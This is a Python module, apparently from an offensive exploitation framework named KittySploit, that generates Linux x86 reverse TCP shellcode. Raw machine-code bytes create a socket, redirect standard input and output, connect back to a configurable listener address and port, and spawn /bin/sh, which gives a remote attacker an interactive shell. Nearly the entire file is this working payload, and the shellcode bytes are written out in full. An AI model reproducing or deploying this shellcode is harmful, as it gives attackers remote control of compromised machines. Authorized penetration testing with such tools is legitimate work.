from kittysploit import *


class Module(Payload):
	"""Linux x86 reverse TCP stager (connect + dup2 + execve /bin/sh)."""

	__info__ = {
		"name": "Linux x86 Reverse TCP Stager",
		"description": "Position-independent x86 Linux reverse TCP shellcode (socket+connect+dup2+/bin/sh)",
		"author": "KittySploit Team",
		"category": PayloadCategory.STAGER,
		"arch": Arch.X86,
		"platform": Platform.LINUX,
		"listener": "listeners/multi/reverse_tcp",
		"handler": Handler.REVERSE,
		"session_type": SessionType.SHELL,
	}

	lhost = OptString("127.0.0.1", "Connect-back IP", True)
	lport = OptPort(4444, "Connect-back port", True)

	def generate(self):
		# Metasploit-style linux/x86/shell_reverse_tcp (socketcall)
		# sockaddr: push IP; push family|port
		sc = bytearray()
		sc += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"  # socket
		sc += b"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9"  # dup2 0..2 (ebx=sock)
		sc += b"\x68"
		sc += self.shellcode_ip(str(self.lhost))
		sc += b"\x68\x02\x00"
		sc += self.shellcode_port(int(self.lport))
		sc += b"\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80"  # connect
		sc += (
			b"\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
			b"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
		)  # execve //bin/sh
		return bytes(sc)
